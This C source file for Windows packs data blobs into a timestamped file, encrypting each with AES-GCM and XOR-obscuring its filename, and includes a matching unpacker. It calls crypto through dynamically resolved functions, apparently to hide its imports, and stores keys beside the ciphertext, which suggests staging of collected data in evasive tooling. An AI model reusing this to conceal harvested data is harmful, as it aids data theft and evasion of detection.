#include "Headers.h"


typedef struct _ENCRYPTED_JSON_ENTRY 
{
    DWORD   dwTotalSize;
    BYTE    Signature[BUFFER_SIZE_08];
    BYTE    AesKey[BUFFER_SIZE_32];
    BYTE    AesIv[AES_GCM_IV_SIZE];
    BYTE    AesTag[AES_GCM_TAG_SIZE];
    DWORD   dwXoredFilenameLen;
    BYTE    XoredFilename[MAX_PATH];
    DWORD   dwEncryptedDataLen;
    PBYTE   pbEncryptedData;
} ENCRYPTED_JSON_ENTRY, *PENCRYPTED_JSON_ENTRY;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Extern Global (Defined in 'Main.cpp')

extern DINMCLY_RSOLVD_FUNCTIONS g_ResolvedFunctions;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static VOID XorWithSignature(IN OUT PBYTE pbData, IN DWORD dwDataLen, IN PBYTE pbSignature, IN DWORD dwSignatureLen)
{
    if (!pbData || !pbSignature || dwDataLen == 0 || dwSignatureLen == 0)
        return;

    for (DWORD i = 0; i < dwDataLen; i++)
        pbData[i] ^= pbSignature[i % dwSignatureLen];
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL AesGcmEncrypt(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbPlaintext, IN ULONG cbPlaintext, OUT PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbCiphertext, OUT PDWORD pcbCiphertext)
{
    BCRYPT_ALG_HANDLE                       hAlg            = NULL;
    BCRYPT_KEY_HANDLE                       hKey            = NULL;
    PBYTE                                   pbCiphertext    = NULL;
    DWORD                                   dwCiphertext    = 0x00;
    ULONG                                   cbResult        = 0x00;
    NTSTATUS                                ntStatus        = 0x00;
    BOOL                                    bResult         = FALSE;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO   AuthInfo        = { 0 };

    if (!pbKey || !pbIv || !pbPlaintext || !pbTag || !ppbCiphertext || !pcbCiphertext)
        return FALSE;

    if ((ntStatus = g_ResolvedFunctions.pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
    {
        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = g_ResolvedFunctions.pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) != 0)
    {
        DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = g_ResolvedFunctions.pBCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, cbKey, 0)) != 0)
    {
        DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }
    
    dwCiphertext        = cbPlaintext;

    BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
    AuthInfo.pbNonce    = pbIv;
    AuthInfo.cbNonce    = cbIv;
    AuthInfo.pbTag      = pbTag;
    AuthInfo.cbTag      = cbTag;

    if (!(pbCiphertext = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCiphertext)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((ntStatus = g_ResolvedFunctions.pBCryptEncrypt(hKey, pbPlaintext, cbPlaintext, &AuthInfo, NULL, 0, pbCiphertext, dwCiphertext, &cbResult, 0)) != 0)
    {
        DBGA("[!] BCryptEncrypt Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    *ppbCiphertext  = pbCiphertext;
    *pcbCiphertext  = (DWORD)cbResult;
    pbCiphertext    = NULL;
    bResult         = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbCiphertext);
    if (hKey) g_ResolvedFunctions.pBCryptDestroyKey(hKey);
    if (hAlg) g_ResolvedFunctions.pBCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitEncryptedJsonPack(OUT PENCRYPTED_JSON_PACK pPack, IN PBYTE pbSignature, IN DWORD dwSignatureLen)
{
    SYSTEMTIME  SysTime                     = { 0 };

    if (!pPack || !pbSignature || dwSignatureLen == 0 || dwSignatureLen > BUFFER_SIZE_08)
        return FALSE;

    RtlZeroMemory(pPack, sizeof(ENCRYPTED_JSON_PACK));

    GetLocalTime(&SysTime);

    StringCchPrintfA(pPack->szOutputPath, _countof(pPack->szOutputPath), STR_ENC_JSON_PACK_FORMAT,
        SysTime.wYear % 100,
        SysTime.wMonth,
        SysTime.wDay,
        SysTime.wHour,
        SysTime.wMinute,
        SysTime.wSecond);

    if ((pPack->hOutputFile = CreateFileA(pPack->szOutputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        DBGA("[!] CreateFileA Failed Creating %s With Error: %lu", pPack->szOutputPath, GetLastError());
        return FALSE;
    }

    RtlCopyMemory(pPack->Signature, pbSignature, dwSignatureLen);
    pPack->dwSignatureLen   = dwSignatureLen;
    pPack->dwEntryCount     = 0x00;


    return TRUE;
}

VOID CloseEncryptedJsonPack(IN PENCRYPTED_JSON_PACK pPack)
{
    if (!pPack) return;

    if (pPack->hOutputFile && pPack->hOutputFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(pPack->hOutputFile);
        pPack->hOutputFile = INVALID_HANDLE_VALUE;
    }

    RtlSecureZeroMemory(pPack, sizeof(ENCRYPTED_JSON_PACK));
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL WriteEncJsonEntryToFile(IN HANDLE hFile, IN PENCRYPTED_JSON_ENTRY pEntry)
{
    DWORD dwWritten = 0x00;

    if (!hFile || hFile == INVALID_HANDLE_VALUE || !pEntry)
        return FALSE;

    if (!WriteFile(hFile, &pEntry->dwTotalSize, sizeof(DWORD), &dwWritten, NULL) || dwWritten != sizeof(DWORD))
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, (DWORD)sizeof(DWORD));
        return FALSE;
    }

    if (!WriteFile(hFile, pEntry->Signature, BUFFER_SIZE_08, &dwWritten, NULL) || dwWritten != BUFFER_SIZE_08)
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, (DWORD)BUFFER_SIZE_08);
        return FALSE;
    }

    if (!WriteFile(hFile, pEntry->AesKey, BUFFER_SIZE_32, &dwWritten, NULL) || dwWritten != BUFFER_SIZE_32)
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, (DWORD)BUFFER_SIZE_32);
        return FALSE;
    }

    if (!WriteFile(hFile, pEntry->AesIv, AES_GCM_IV_SIZE, &dwWritten, NULL) || dwWritten != AES_GCM_IV_SIZE)
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, (DWORD)AES_GCM_IV_SIZE);
        return FALSE;
    }

    if (!WriteFile(hFile, pEntry->AesTag, AES_GCM_TAG_SIZE, &dwWritten, NULL) || dwWritten != AES_GCM_TAG_SIZE)
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, (DWORD)AES_GCM_TAG_SIZE);
        return FALSE;
    }

    if (!WriteFile(hFile, &pEntry->dwXoredFilenameLen, sizeof(DWORD), &dwWritten, NULL) || dwWritten != sizeof(DWORD))
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, (DWORD)sizeof(DWORD));
        return FALSE;
    }

    if (!WriteFile(hFile, pEntry->XoredFilename, pEntry->dwXoredFilenameLen, &dwWritten, NULL) || dwWritten != pEntry->dwXoredFilenameLen)
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, pEntry->dwXoredFilenameLen);
        return FALSE;
    }

    if (!WriteFile(hFile, &pEntry->dwEncryptedDataLen, sizeof(DWORD), &dwWritten, NULL) || dwWritten != sizeof(DWORD))
    {
        DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, (DWORD)sizeof(DWORD));
        return FALSE;
    }

    if (pEntry->dwEncryptedDataLen > 0 && pEntry->pbEncryptedData)
    {
        if (!WriteFile(hFile, pEntry->pbEncryptedData, pEntry->dwEncryptedDataLen, &dwWritten, NULL) || dwWritten != pEntry->dwEncryptedDataLen)
        {
            DBGA("[!] WriteFile [%d] Failed With Error: %lu\n[i] Wrote %lu of %lu bytes", __LINE__, GetLastError(), dwWritten, pEntry->dwEncryptedDataLen);
            return FALSE;
        }
    }

    return TRUE;
}

BOOL EncryptAndAddJsonEntry(IN PENCRYPTED_JSON_PACK pPack, IN LPCSTR pszFilename, IN PBYTE pbData, IN DWORD dwDataLen)
{
    BOOL                    bResult         = FALSE;
    ENCRYPTED_JSON_ENTRY    Entry           = { 0 };
    DWORD                   dwFilenameLen   = 0x00;
    PBYTE                   pbCiphertext    = NULL;
    DWORD                   dwCiphertextLen = 0x00;

    if (!pPack || !pPack->hOutputFile || pPack->hOutputFile == INVALID_HANDLE_VALUE)
        return FALSE;

    if (!pszFilename || !pbData || dwDataLen == 0)
        return FALSE;

    if ((dwFilenameLen = lstrlenA(pszFilename)) == 0 || dwFilenameLen >= MAX_PATH)
    {
        DBGA("[!] Invalid Filename Length: %lu", dwFilenameLen);
        return FALSE;
    }

    RtlCopyMemory(Entry.Signature, pPack->Signature, BUFFER_SIZE_08);

    // Generate random key and IV
    if (!GenerateRandomBytes(Entry.AesKey, BUFFER_SIZE_32))
        return FALSE;

    if (!GenerateRandomBytes(Entry.AesIv, AES_GCM_IV_SIZE))
        goto _END_OF_FUNC;

    // XOR the filename
    Entry.dwXoredFilenameLen = dwFilenameLen;
    RtlCopyMemory(Entry.XoredFilename, pszFilename, dwFilenameLen);
    XorWithSignature(Entry.XoredFilename, dwFilenameLen, pPack->Signature, pPack->dwSignatureLen);

    // Encrypt data
    if (!AesGcmEncrypt(Entry.AesKey, BUFFER_SIZE_32, Entry.AesIv, AES_GCM_IV_SIZE, pbData, dwDataLen, Entry.AesTag, AES_GCM_TAG_SIZE, &pbCiphertext, &dwCiphertextLen))
        goto _END_OF_FUNC;

    Entry.pbEncryptedData    = pbCiphertext;
    Entry.dwEncryptedDataLen = dwCiphertextLen;

    // Calculate total size
    Entry.dwTotalSize = sizeof(DWORD) +             // dwTotalSize
                        BUFFER_SIZE_08 +            // Signature
                        BUFFER_SIZE_32 +            // AesKey
                        AES_GCM_IV_SIZE +           // AesIv
                        AES_GCM_TAG_SIZE +          // AesTag
                        sizeof(DWORD) +             // dwXoredFilenameLen
                        Entry.dwXoredFilenameLen +  // XoredFilename
                        sizeof(DWORD) +             // dwEncryptedDataLen
                        Entry.dwEncryptedDataLen;   // EncryptedData

    // Write to file
    if (!WriteEncJsonEntryToFile(pPack->hOutputFile, &Entry))
        goto _END_OF_FUNC;

    pPack->dwEntryCount++;
    
    bResult = TRUE;

_END_OF_FUNC:
    RtlSecureZeroMemory(Entry.AesKey, BUFFER_SIZE_32);
    RtlSecureZeroMemory(Entry.AesIv, AES_GCM_IV_SIZE);
    HEAP_FREE(pbCiphertext);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL DecryptJsonPack(IN LPCSTR pszInputFile, IN PBYTE pbSignature, IN DWORD dwSignatureLen)
{
    BOOL                    bResult                 = FALSE;
    PBYTE                   pbFileData              = NULL;
    DWORD                   dwFileSize              = 0x00;
    DWORD                   dwOffset                = 0x00;
    DWORD                   dwEntryCount            = 0x00;
    DWORD                   dwSuccessCount          = 0x00;
    ENCRYPTED_JSON_ENTRY    Entry                   = { 0 };
    PBYTE                   pbDecryptedData         = NULL;
    DWORD                   dwDecryptedDataLen      = 0x00;
    CHAR                    szOutputPath[MAX_PATH]  = { 0 };

    if (!pszInputFile || !pbSignature || dwSignatureLen == 0 || dwSignatureLen > BUFFER_SIZE_08)
        return FALSE;

    DBGA("[i] Decrypting: %s", pszInputFile);

    if (!ReadFileFromDiskA(pszInputFile, &pbFileData, &dwFileSize))
        return FALSE;

    DBGA("[i] File Size: %lu bytes", dwFileSize);

    while (dwOffset < dwFileSize)
    {
        RtlZeroMemory(&Entry, sizeof(ENCRYPTED_JSON_ENTRY));
        pbDecryptedData = NULL;
        dwDecryptedDataLen = 0;

        // Read dwTotalSize
        if (dwOffset + sizeof(DWORD) > dwFileSize)
        {
            DBGA("[!] Unexpected End Of File At Offset: %lu", dwOffset);
            break;
        }
        RtlCopyMemory(&Entry.dwTotalSize, pbFileData + dwOffset, sizeof(DWORD));
        dwOffset += sizeof(DWORD);

        if (Entry.dwTotalSize == 0 || dwOffset + Entry.dwTotalSize - sizeof(DWORD) > dwFileSize)
        {
            DBGA("[!] Invalid Entry Size: %lu At Offset: %zu", Entry.dwTotalSize, dwOffset - sizeof(DWORD));
            break;
        }

        // Read Signature
        if (dwOffset + BUFFER_SIZE_08 > dwFileSize)
            break;
        RtlCopyMemory(Entry.Signature, pbFileData + dwOffset, BUFFER_SIZE_08);
        dwOffset += BUFFER_SIZE_08;

        // Verify signature
        if (RtlCompareMemory(Entry.Signature, pbSignature, dwSignatureLen) != dwSignatureLen)
        {
            DBGA("[!] Signature Mismatch At Entry %lu", dwEntryCount + 1);
            dwOffset += Entry.dwTotalSize - sizeof(DWORD) - BUFFER_SIZE_08;
            dwEntryCount++;
            continue;
        }

        // Read AesKey
        if (dwOffset + BUFFER_SIZE_32 > dwFileSize)
            break;
        RtlCopyMemory(Entry.AesKey, pbFileData + dwOffset, BUFFER_SIZE_32);
        dwOffset += BUFFER_SIZE_32;

        // Read AesIv
        if (dwOffset + AES_GCM_IV_SIZE > dwFileSize)
            break;
        RtlCopyMemory(Entry.AesIv, pbFileData + dwOffset, AES_GCM_IV_SIZE);
        dwOffset += AES_GCM_IV_SIZE;

        // Read AesTag
        if (dwOffset + AES_GCM_TAG_SIZE > dwFileSize)
            break;
        RtlCopyMemory(Entry.AesTag, pbFileData + dwOffset, AES_GCM_TAG_SIZE);
        dwOffset += AES_GCM_TAG_SIZE;

        // Read dwXoredFilenameLen
        if (dwOffset + sizeof(DWORD) > dwFileSize)
            break;
        RtlCopyMemory(&Entry.dwXoredFilenameLen, pbFileData + dwOffset, sizeof(DWORD));
        dwOffset += sizeof(DWORD);

        if (Entry.dwXoredFilenameLen == 0 || Entry.dwXoredFilenameLen >= MAX_PATH)
        {
            DBGA("[!] Invalid Filename Length: %lu", Entry.dwXoredFilenameLen);
            break;
        }

        // Read XoredFilename
        if (dwOffset + Entry.dwXoredFilenameLen > dwFileSize)
            break;
        RtlCopyMemory(Entry.XoredFilename, pbFileData + dwOffset, Entry.dwXoredFilenameLen);
        dwOffset += Entry.dwXoredFilenameLen;

        // XOR to get original filename
        XorWithSignature(Entry.XoredFilename, Entry.dwXoredFilenameLen, pbSignature, dwSignatureLen);

        // Read dwEncryptedDataLen
        if (dwOffset + sizeof(DWORD) > dwFileSize)
            break;
        RtlCopyMemory(&Entry.dwEncryptedDataLen, pbFileData + dwOffset, sizeof(DWORD));
        dwOffset += sizeof(DWORD);

        if (Entry.dwEncryptedDataLen == 0)
        {
            DBGA("[!] Invalid Encrypted Data Length: %lu", Entry.dwEncryptedDataLen);
            break;
        }

        // Point to EncryptedData (no copy needed)
        if (dwOffset + Entry.dwEncryptedDataLen > dwFileSize)
            break;
        Entry.pbEncryptedData = pbFileData + dwOffset;
        dwOffset += Entry.dwEncryptedDataLen;

        // Decrypt
        if (!DecryptAesGcm(Entry.AesKey, BUFFER_SIZE_32, Entry.AesIv, AES_GCM_IV_SIZE, Entry.pbEncryptedData, Entry.dwEncryptedDataLen, Entry.AesTag, AES_GCM_TAG_SIZE, &pbDecryptedData, &dwDecryptedDataLen))
        {
            DBGA("[!] Failed To Decrypt Entry: %s", (LPCSTR)Entry.XoredFilename);
            dwEntryCount++;
            continue;
        }

        // Build output path
        StringCchCopyA(szOutputPath, MAX_PATH, (LPCSTR)Entry.XoredFilename);

        // Write decrypted file
        if (WriteFileToDiskA(szOutputPath, pbDecryptedData, dwDecryptedDataLen))
        {
            DBGA("[+] Decrypted JSON Data Of: %s", szOutputPath);
            dwSuccessCount++;
        }

        // Cleanup
        if (pbDecryptedData)
        {
            RtlSecureZeroMemory(pbDecryptedData, dwDecryptedDataLen);
            HEAP_FREE(pbDecryptedData);
        }

        RtlSecureZeroMemory(Entry.AesKey, BUFFER_SIZE_32);
        RtlSecureZeroMemory(Entry.AesIv, AES_GCM_IV_SIZE);

        wprintf(L"[i] Unpacked %S From %S\n", szOutputPath, pszInputFile);

        dwEntryCount++;
    }

    DBGA("[i] Processed %lu Entries, %lu Decrypted Successfully", dwEntryCount, dwSuccessCount);

    bResult = (dwSuccessCount > 0);

    if (pbFileData)
    {
        RtlSecureZeroMemory(pbFileData, dwFileSize);
        HEAP_FREE(pbFileData);
    }

    return bResult;
}